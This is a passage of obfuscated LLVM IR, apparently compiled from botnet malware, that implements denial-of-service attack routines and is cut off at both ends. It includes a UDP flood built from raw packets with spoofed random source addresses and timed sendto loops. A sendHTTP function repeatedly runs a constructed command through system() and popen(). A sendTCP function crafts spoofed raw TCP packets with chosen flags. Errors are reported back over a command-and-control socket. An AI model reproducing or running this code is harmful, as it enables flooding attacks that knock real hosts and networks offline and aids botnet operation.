; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* @mainCommSock, align 4
  %62 = call i32 (i32, i8*, ...) @sockprintf(i32 %61, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.37, i32 0, i32 0))
  store i32 -912643864, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i32, i32* %11, align 4
  %65 = add nsw i32 %64, 1
  %66 = sext i32 %65 to i64
  %67 = call noalias i8* @malloc(i64 %66) #4
  store i8* %67, i8** %16, align 8
  %68 = load i8*, i8** %16, align 8
  %69 = icmp eq i8* %68, null
  %70 = select i1 %69, i32 -175767412, i32 -652304492
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  store i32 -912643864, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i8*, i8** %16, align 8
  %74 = load i32, i32* %11, align 4
  %75 = add nsw i32 %74, 1
  %76 = sext i32 %75 to i64
  call void @llvm.memset.p0i8.i64(i8* %73, i8 0, i64 %76, i32 1, i1 false)
  %77 = load i8*, i8** %16, align 8
  %78 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %77, i32 %78)
  %79 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %80 = load i32, i32* %9, align 4
  %81 = add nsw i32 %79, %80
  store i32 %81, i32* %17, align 4
  store i32 0, i32* %18, align 4
  store i32 -1230428397, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %15, align 4
  %84 = load i8*, i8** %16, align 8
  %85 = load i32, i32* %11, align 4
  %86 = sext i32 %85 to i64
  %87 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %88 = call i64 @sendto(i32 %83, i8* %84, i64 %86, i32 0, %struct.sockaddr* %87, i32 16)
  %89 = load i32, i32* %18, align 4
  %90 = load i32, i32* %14, align 4
  %91 = icmp eq i32 %89, %90
  %92 = select i1 %91, i32 503425663, i32 -687888883
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i32, i32* %8, align 4
  %95 = icmp eq i32 %94, 0
  %96 = select i1 %95, i32 -1207045201, i32 1647476704
  store i32 %96, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  %98 = call i32 @rand_cmwc()
  %99 = trunc i32 %98 to i16
  %100 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %99, i16* %100, align 2
  store i32 1647476704, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %103 = load i32, i32* %17, align 4
  %104 = icmp sgt i32 %102, %103
  %105 = select i1 %104, i32 1391594463, i32 1153045478
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  store i32 -1801760343, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  store i32 0, i32* %18, align 4
  store i32 -1230428397, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  %109 = load i32, i32* %18, align 4
  %110 = add i32 %109, 1
  store i32 %110, i32* %18, align 4
  store i32 -1230428397, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  store i32 -912643864, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = call i32 @socket(i32 2, i32 3, i32 17) #4
  store i32 %113, i32* %19, align 4
  %114 = load i32, i32* %19, align 4
  %115 = icmp ne i32 %114, 0
  %116 = select i1 %115, i32 99152543, i32 -1465803484
  store i32 %116, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i32, i32* @mainCommSock, align 4
  %119 = call i32 (i32, i8*, ...) @sockprintf(i32 %118, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.37, i32 0, i32 0))
  store i32 -912643864, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 1, i32* %20, align 4
  %121 = load i32, i32* %19, align 4
  %122 = bitcast i32* %20 to i8*
  %123 = call i32 @setsockopt(i32 %121, i32 0, i32 3, i8* %122, i32 4) #4
  %124 = icmp slt i32 %123, 0
  %125 = select i1 %124, i32 -838970730, i32 1425534036
  store i32 %125, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = load i32, i32* @mainCommSock, align 4
  %128 = call i32 (i32, i8*, ...) @sockprintf(i32 %127, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.38, i32 0, i32 0))
  store i32 -912643864, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  store i32 50, i32* %21, align 4
  store i32 -284537136, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = load i32, i32* %21, align 4
  %132 = add nsw i32 %131, -1
  store i32 %132, i32* %21, align 4
  %133 = icmp ne i32 %131, 0
  %134 = select i1 %133, i32 -1754509082, i32 -1019078104
  store i32 %134, i32* %switchVar
  br label %loopEnd

; <label>:135:                                    ; preds = %loopEntry
  %136 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %137 = call i32 @rand_cmwc()
  %138 = xor i32 %136, %137
  call void @srand(i32 %138) #4
  %139 = call i32 @rand() #4
  call void @init_rand(i32 %139)
  store i32 -284537136, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %141 = load i32, i32* %10, align 4
  %142 = icmp eq i32 %141, 0
  %143 = select i1 %142, i32 1873002771, i32 208604064
  store i32 %143, i32* %switchVar
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
  store i32 0, i32* %22, align 4
  store i32 964414913, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  %146 = load i32, i32* %10, align 4
  %147 = sub nsw i32 32, %146
  %148 = shl i32 1, %147
  %149 = sub nsw i32 %148, 1
  %150 = xor i32 %149, -1
  store i32 %150, i32* %22, align 4
  store i32 964414913, i32* %switchVar
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %152 = load i32, i32* %11, align 4
  %153 = sext i32 %152 to i64
  %154 = add i64 28, %153
  store i64 %154, i64* %.reg2mem2
  %155 = call i8* @llvm.stacksave()
  store i8* %155, i8** %23, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %156 = alloca i8, i64 %.reload4, align 16
  store i8* %156, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %157 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %157, %struct.iphdr** %24, align 8
  %158 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %159 = bitcast %struct.iphdr* %158 to i8*
  %160 = getelementptr i8, i8* %159, i64 20
  %161 = bitcast i8* %160 to %struct.udphdr*
  store %struct.udphdr* %161, %struct.udphdr** %25, align 8
  %162 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %163 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %164 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %163, i32 0, i32 0
  %165 = load i32, i32* %164, align 4
  %166 = load i32, i32* %22, align 4
  %167 = call i32 @getRandomIP(i32 %166)
  %168 = call i32 @htonl(i32 %167) #13
  %169 = load i32, i32* %11, align 4
  %170 = sext i32 %169 to i64
  %171 = add i64 8, %170
  %172 = trunc i64 %171 to i32
  call void @makeIPPacket(%struct.iphdr* %162, i32 %165, i32 %168, i8 zeroext 17, i32 %172)
  %173 = load i32, i32* %11, align 4
  %174 = sext i32 %173 to i64
  %175 = add i64 8, %174
  %176 = trunc i64 %175 to i16
  %177 = call zeroext i16 @htons(i16 zeroext %176) #13
  %178 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %179 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %178, i32 0, i32 0
  %180 = bitcast %union.anon.2* %179 to %struct.anon.3*
  %181 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %180, i32 0, i32 2
  store i16 %177, i16* %181, align 2
  %182 = call i32 @rand_cmwc()
  %183 = trunc i32 %182 to i16
  %184 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %185 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %184, i32 0, i32 0
  %186 = bitcast %union.anon.2* %185 to %struct.anon.3*
  %187 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %186, i32 0, i32 0
  store i16 %183, i16* %187, align 2
  %188 = load i32, i32* %8, align 4
  %189 = icmp eq i32 %188, 0
  %190 = select i1 %189, i32 623396284, i32 -968329286
  store i32 %190, i32* %switchVar
  br label %loopEnd

; <label>:191:                                    ; preds = %loopEntry
  %192 = call i32 @rand_cmwc()
  store i32 -2069409956, i32* %switchVar
  store i32 %192, i32* %.reg2mem10
  br label %loopEnd

; <label>:193:                                    ; preds = %loopEntry
  %194 = load i32, i32* %8, align 4
  %195 = trunc i32 %194 to i16
  %196 = call zeroext i16 @htons(i16 zeroext %195) #13
  %197 = zext i16 %196 to i32
  store i32 -2069409956, i32* %switchVar
  store i32 %197, i32* %.reg2mem10
  br label %loopEnd

; <label>:198:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %199 = trunc i32 %.reload11 to i16
  %200 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %201 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %200, i32 0, i32 0
  %202 = bitcast %union.anon.2* %201 to %struct.anon.3*
  %203 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %202, i32 0, i32 1
  store i16 %199, i16* %203, align 2
  %204 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %205 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %204, i32 0, i32 0
  %206 = bitcast %union.anon.2* %205 to %struct.anon.3*
  %207 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %206, i32 0, i32 3
  store i16 0, i16* %207, align 2
  %208 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %209 = bitcast %struct.udphdr* %208 to i8*
  %210 = getelementptr inbounds i8, i8* %209, i64 8
  %211 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %210, i32 %211)
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %212 = bitcast i8* %.reload8 to i16*
  %213 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %214 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %213, i32 0, i32 2
  %215 = load i16, i16* %214, align 2
  %216 = zext i16 %215 to i32
  %217 = call zeroext i16 @csum(i16* %212, i32 %216)
  %218 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 7
  store i16 %217, i16* %219, align 2
  %220 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %221 = load i32, i32* %9, align 4
  %222 = add nsw i32 %220, %221
  store i32 %222, i32* %26, align 4
  store i32 0, i32* %27, align 4
  store i32 550503646, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  store i32 -1663878033, i32* %switchVar
  br label %loopEnd

; <label>:224:                                    ; preds = %loopEntry
  %225 = load i32, i32* %19, align 4
  %226 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %227 = call i64 @sendto(i32 %225, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %226, i32 16)
  %228 = call i32 @rand_cmwc()
  %229 = trunc i32 %228 to i16
  %230 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %231 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %230, i32 0, i32 0
  %232 = bitcast %union.anon.2* %231 to %struct.anon.3*
  %233 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %232, i32 0, i32 0
  store i16 %229, i16* %233, align 2
  %234 = load i32, i32* %8, align 4
  %235 = icmp eq i32 %234, 0
  %236 = select i1 %235, i32 -516359559, i32 -1095606487
  store i32 %236, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  %238 = call i32 @rand_cmwc()
  store i32 -1282968265, i32* %switchVar
  store i32 %238, i32* %.reg2mem12
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  %240 = load i32, i32* %8, align 4
  %241 = trunc i32 %240 to i16
  %242 = call zeroext i16 @htons(i16 zeroext %241) #13
  %243 = zext i16 %242 to i32
  store i32 -1282968265, i32* %switchVar
  store i32 %243, i32* %.reg2mem12
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %.reload13 = load i32, i32* %.reg2mem12
  %245 = trunc i32 %.reload13 to i16
  %246 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %247 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %246, i32 0, i32 0
  %248 = bitcast %union.anon.2* %247 to %struct.anon.3*
  %249 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %248, i32 0, i32 1
  store i16 %245, i16* %249, align 2
  %250 = call i32 @rand_cmwc()
  %251 = trunc i32 %250 to i16
  %252 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %252, i32 0, i32 3
  store i16 %251, i16* %253, align 4
  %254 = load i32, i32* %22, align 4
  %255 = call i32 @getRandomIP(i32 %254)
  %256 = call i32 @htonl(i32 %255) #13
  %257 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %258 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %257, i32 0, i32 8
  store i32 %256, i32* %258, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %259 = bitcast i8* %.reload6 to i16*
  %260 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %261 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %260, i32 0, i32 2
  %262 = load i16, i16* %261, align 2
  %263 = zext i16 %262 to i32
  %264 = call zeroext i16 @csum(i16* %259, i32 %263)
  %265 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %266 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %265, i32 0, i32 7
  store i16 %264, i16* %266, align 2
  %267 = load i32, i32* %27, align 4
  %268 = load i32, i32* %14, align 4
  %269 = icmp eq i32 %267, %268
  %270 = select i1 %269, i32 1294060347, i32 -345608746
  store i32 %270, i32* %switchVar
  br label %loopEnd

; <label>:271:                                    ; preds = %loopEntry
  %272 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %273 = load i32, i32* %26, align 4
  %274 = icmp sgt i32 %272, %273
  %275 = select i1 %274, i32 1264943742, i32 2050345541
  store i32 %275, i32* %switchVar
  br label %loopEnd

; <label>:276:                                    ; preds = %loopEntry
  store i32 1456671346, i32* %switchVar
  br label %loopEnd

; <label>:277:                                    ; preds = %loopEntry
  store i32 0, i32* %27, align 4
  store i32 550503646, i32* %switchVar
  br label %loopEnd

; <label>:278:                                    ; preds = %loopEntry
  %279 = load i32, i32* %27, align 4
  %280 = add i32 %279, 1
  store i32 %280, i32* %27, align 4
  store i32 550503646, i32* %switchVar
  br label %loopEnd

; <label>:281:                                    ; preds = %loopEntry
  %282 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %282)
  store i32 -912643864, i32* %switchVar
  br label %loopEnd

; <label>:283:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %281, %278, %277, %276, %271, %244, %239, %237, %224, %223, %198, %193, %191, %151, %145, %144, %140, %135, %130, %129, %126, %120, %117, %112, %111, %108, %107, %106, %101, %97, %93, %82, %72, %71, %63, %60, %55, %48, %47, %41, %36, %32, %first, %switchDefault
  br label %loopEntry
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #5

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct._IO_FILE*, align 8
  %7 = alloca [80 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %8 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %9 = load i32, i32* %4, align 4
  %10 = add nsw i32 %8, %9
  store i32 %10, i32* %5, align 4
  %11 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %12 = call i32 (i8*, i8*, ...) @sprintf(i8* %11, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.39, i32 0, i32 0)) #4
  %13 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %14 = load i8*, i8** %3, align 8
  %15 = call i8* @strcat(i8* %13, i8* %14) #4
  %16 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %17 = call i8* @strcat(i8* %16, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.40, i32 0, i32 0)) #4
  %18 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %19 = call %struct._IO_FILE* @popen(i8* %18, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i32 0, i32 0))
  store %struct._IO_FILE* %19, %struct._IO_FILE** %6, align 8
  %switchVar = alloca i32
  store i32 -2032796259, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -2032796259, label %20
    i32 326708040, label %25
    i32 -1454935438, label %28
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %5, align 4
  %22 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %23 = icmp sgt i32 %21, %22
  %24 = select i1 %23, i32 326708040, i32 -1454935438
  store i32 %24, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %27 = call i32 @system(i8* %26)
  store i32 -2032796259, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %25, %20, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #3

declare %struct._IO_FILE* @popen(i8*, i8*) #5

declare i32 @system(i8*) #5

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  store i32 %28, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -708441154, i32* %switchVar
  %.reg2mem10 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -708441154, label %first
    i32 1113823668, label %31
    i32 360256883, label %35
    i32 896983389, label %40
    i32 940155397, label %46
    i32 1817887847, label %47
    i32 622815023, label %54
    i32 -1447453225, label %57
    i32 -1796021343, label %63
    i32 145929712, label %66
    i32 1859391969, label %70
    i32 -1360798177, label %71
    i32 -319360667, label %77
    i32 -1269880272, label %125
    i32 -641510043, label %161
    i32 754299959, label %164
    i32 -1751004917, label %168
    i32 -1514921323, label %173
    i32 -1266892177, label %181
    i32 1236906309, label %186
    i32 -935100809, label %194
    i32 631323812, label %199
    i32 -782111112, label %207
    i32 -1693639392, label %212
    i32 -394573115, label %220
    i32 627098714, label %225
    i32 312203597, label %233
    i32 -1908837480, label %237
    i32 1737698286, label %238
    i32 -1066527591, label %239
    i32 -1042173975, label %240
    i32 -886898460, label %241
    i32 18696412, label %243
    i32 -354684139, label %244
    i32 -1739411605, label %262
    i32 -815477329, label %264
    i32 -742892118, label %269
    i32 -1098838998, label %293
    i32 -1747142718, label %294
    i32 2118317761, label %341
    i32 -1304490714, label %346
    i32 -367413442, label %347
    i32 1514918125, label %348
    i32 777706621, label %351
    i32 -1151200494, label %353
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %29 = icmp eq i32 %.reload, 0
  %30 = select i1 %29, i32 1113823668, i32 360256883
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  store i32 896983389, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %9, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #13
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  store i32 896983389, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %8, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  %45 = select i1 %44, i32 940155397, i32 1817887847
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 -1151200494, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %49 = getelementptr inbounds [8 x i8], [8 x i8]* %48, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %49, i8 0, i64 8, i32 4, i1 false)
  %50 = call i32 @socket(i32 2, i32 3, i32 6) #4
  store i32 %50, i32* %17, align 4
  %51 = load i32, i32* %17, align 4
  %52 = icmp ne i32 %51, 0
  %53 = select i1 %52, i32 -1447453225, i32 622815023
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* @mainCommSock, align 4
  %56 = call i32 (i32, i8*, ...) @sockprintf(i32 %55, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.37, i32 0, i32 0))
  store i32 -1151200494, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  store i32 1, i32* %18, align 4
  %58 = load i32, i32* %17, align 4
  %59 = bitcast i32* %18 to i8*
  %60 = call i32 @setsockopt(i32 %58, i32 0, i32 3, i8* %59, i32 4) #4
  %61 = icmp slt i32 %60, 0
  %62 = select i1 %61, i32 -1796021343, i32 145929712
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i32, i32* @mainCommSock, align 4
  %65 = call i32 (i32, i8*, ...) @sockprintf(i32 %64, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.38, i32 0, i32 0))
  store i32 -1151200494, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %11, align 4
  %68 = icmp eq i32 %67, 0
  %69 = select i1 %68, i32 1859391969, i32 -1360798177
  store i32 %69, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  store i32 0, i32* %19, align 4
  store i32 -319360667, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %11, align 4
  %73 = sub nsw i32 32, %72
  %74 = shl i32 1, %73
  %75 = sub nsw i32 %74, 1
  %76 = xor i32 %75, -1
  store i32 %76, i32* %19, align 4
  store i32 -319360667, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = load i32, i32* %13, align 4
  %79 = sext i32 %78 to i64
  %80 = add i64 40, %79
  store i64 %80, i64* %.reg2mem2
  %81 = call i8* @llvm.stacksave()
  store i8* %81, i8** %20, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %82 = alloca i8, i64 %.reload4, align 16
  store i8* %82, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %83 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %83, %struct.iphdr** %21, align 8
  %84 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %85 = bitcast %struct.iphdr* %84 to i8*
  %86 = getelementptr i8, i8* %85, i64 20
  %87 = bitcast i8* %86 to %struct.tcphdr*
  store %struct.tcphdr* %87, %struct.tcphdr** %22, align 8
  %88 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %90 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %89, i32 0, i32 0
  %91 = load i32, i32* %90, align 4
  %92 = load i32, i32* %19, align 4
  %93 = call i32 @getRandomIP(i32 %92)
  %94 = call i32 @htonl(i32 %93) #13
  %95 = load i32, i32* %13, align 4
  %96 = sext i32 %95 to i64
  %97 = add i64 20, %96
  %98 = trunc i64 %97 to i32
  call void @makeIPPacket(%struct.iphdr* %88, i32 %91, i32 %94, i8 zeroext 6, i32 %98)
  %99 = call i32 @rand_cmwc()
  %100 = trunc i32 %99 to i16
  %101 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %102 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %101, i32 0, i32 0
  %103 = bitcast %union.anon.0* %102 to %struct.anon.1*
  %104 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %103, i32 0, i32 0
  store i16 %100, i16* %104, align 4
  %105 = call i32 @rand_cmwc()
  %106 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %107 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %106, i32 0, i32 0
  %108 = bitcast %union.anon.0* %107 to %struct.anon.1*
  %109 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %108, i32 0, i32 2
  store i32 %105, i32* %109, align 4
  %110 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %111 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %110, i32 0, i32 0
  %112 = bitcast %union.anon.0* %111 to %struct.anon.1*
  %113 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %112, i32 0, i32 3
  store i32 0, i32* %113, align 4
  %114 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %115 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %114, i32 0, i32 0
  %116 = bitcast %union.anon.0* %115 to %struct.anon.1*
  %117 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %116, i32 0, i32 4
  %118 = load i16, i16* %117, align 4
  %119 = and i16 %118, -241
  %120 = or i16 %119, 80
  store i16 %120, i16* %117, align 4
  %121 = load i8*, i8** %12, align 8
  %122 = call i32 @strcmp(i8* %121, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.42, i32 0, i32 0)) #10
  %123 = icmp ne i32 %122, 0
  %124 = select i1 %123, i32 -641510043, i32 -1269880272
  store i32 %124, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %127 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %126, i32 0, i32 0
  %128 = bitcast %union.anon.0* %127 to %struct.anon.1*
  %129 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %128, i32 0, i32 4
  %130 = load i16, i16* %129, align 4
  %131 = and i16 %130, -513
  %132 = or i16 %131, 512
  store i16 %132, i16* %129, align 4
